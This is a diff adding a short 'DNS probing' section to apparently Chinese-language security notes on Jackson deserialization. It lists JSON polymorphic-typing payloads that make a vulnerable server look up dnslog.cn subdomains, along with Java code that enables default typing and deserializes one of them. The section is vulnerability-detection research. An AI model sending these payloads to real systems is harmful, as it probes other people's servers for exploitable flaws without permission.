@@ -415,3 +415,22 @@ public class Jackson {
 
 ```
 
+
+
+
+
+## DNS探测
+
+```java
+["java.util.HashSet",[["java.net.URL","http://1wc3gw.dnslog.cn"]]]
+["java.net.InetSocketAddress","36alx7.dnslog.cn"]
+["java.net.InetAddress","ap6d50.dnslog.cn"]
+```
+
+```java
+        String poc = "[\"java.util.HashSet\",[[\"java.net.URL\",\"http://gsf8ag.dnslog.cn\"]]]";
+        ObjectMapper mapper = new ObjectMapper();
+        mapper.enableDefaultTyping();
+        mapper.readValue(poc, Object.class);
+```
+
